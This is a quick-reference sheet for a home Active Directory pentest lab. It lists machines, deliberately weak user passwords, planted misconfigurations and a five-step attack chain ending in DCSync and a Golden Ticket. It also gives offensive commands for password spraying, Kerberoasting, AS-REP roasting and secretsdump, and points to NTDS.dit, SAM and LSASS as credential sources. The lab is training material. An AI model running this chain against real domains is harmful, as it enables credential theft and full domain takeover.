# Napellam Bank AD Lab - Quick Reference

## Network Configuration

| Machine | IP Address | OS | Purpose |
|---------|------------|----|---------| ## | DC01 | 192.168.100.10 | Windows Server 2022 | Domain Controller |
| WS01 | 192.168.100.20 | Windows 10 Pro | IT Department Workstation |
| WS02 | 192.168.100.30 | Windows 10 Pro | Network Admin Workstation |
| KALI | 192.168.100.100 | Kali Linux | Attack Machine |

**Domain:**napellam.local  
**NetBIOS:** NAPELLAM

---

## User Accounts

| Username | Password | Title | Vulnerability/Purpose |
|----------|----------|-------|----------------------|
| Administrator | P@ssw0rd! | Domain Admin | Default admin account |
| ammulu.orsu | princess | IT Manager | **DOMAIN ADMIN** with weak password |
| lakshmi.devi | sunshine | System Admin | **ACL Abuse Target** (IT-Managers has GenericAll) |
| ravi.teja | football | Network Admin | Local Admin on WS02 |
| vamsi.krishna | iloveyou | Bank Manager | **Initial Access** (password spray target) |
| pranavi | butterfly | Branch Manager | **AS-REP Roastable** (no pre-auth) |
| madhavi | letmein | Ops Manager | Standard user |
| divya | chocolate | Loan Officer | Standard user |
| harsha.vardhan | passw0rd | Customer Service | Weak password |
| kiran.kumar | trustno1 | Analyst | Standard user |
| sai.kiran | dragon | Compliance Officer | Standard user |
| svc_backup | backup123 | Backup Service | **KERBEROASTABLE + DCSYNC** |

---

## Attack Chain

```
1. Password Spray → Get vamsi.krishna:iloveyou
2. Kerberoasting → Get svc_backup:backup123
3. AS-REP Roasting → Get pranavi:butterfly
4. DCSync with svc_backup → Get ALL hashes (including Administrator, krbtgt)
5. Golden Ticket → Permanent DA access
```

---

## Configured Vulnerabilities

1. **Kerberoasting** - svc_backup has SPNs registered
2. **AS-REP Roasting** - pranavi has pre-auth disabled
3. **ACL Abuse** - IT-Managers has GenericAll on lakshmi.devi
4. **DCSync Rights** - svc_backup can replicate domain data
5. **Domain Admin User** - ammulu.orsu is DA with weak password
6. **SMB Signing Disabled** - Relay attacks possible
7. **Weak Passwords** - 10 users from rockyou.txt wordlist

---

## Important Paths

### On Domain Controller (DC01)
- **NTDS.dit:** `C:\Windows\NTDS\NTDS.dit` (all domain password hashes)
- **SAM:** `C:\Windows\System32\config\SAM` (local account hashes)

### On Workstations (WS01/WS02)
- **SAM:** `C:\Windows\System32\config\SAM`
- **LSASS:** Running process in memory (dump for cached credentials)

---

## Useful Commands

### PowerShell (on DC01)

```powershell
# List all users
Get-ADUser -Filter * | Select-Object SamAccountName

# Check SPNs for Kerberoasting
Get-ADUser svc_backup -Properties ServicePrincipalNames

# Check for AS-REP Roasting
Get-ADUser pranavi -Properties UserAccountControl

# Check group membership
Get-ADGroupMember -Identity "Domain Admins"
```

### Kali Linux

```bash
# Network scan
nmap -sV -sC -p- 192.168.100.0/24

# Password spray
crackmapexec smb 192.168.100.10 -u users.txt -p passwords.txt

# Kerberoasting
GetUserSPNs.py napellam.local/vamsi.krishna:iloveyou -dc-ip 192.168.100.10 -request

# AS-REP Roasting
GetNPUsers.py napellam.local/ -dc-ip 192.168.100.10 -usersfile users.txt

# DCSync
secretsdump.py napellam.local/svc_backup:backup123@192.168.100.10
```

---

## Next Steps

1. ✅ Build the lab (DC01, WS01, WS02, KALI)
2. ✅ Run setup scripts
3. ⏭ Work through attack walkthroughs (in `walkthroughs/` folder)
4. 📝 Document your findings
5. 🎯 Practice for job interviews

---

**Good luck with your AD pentesting journey!** 🚀
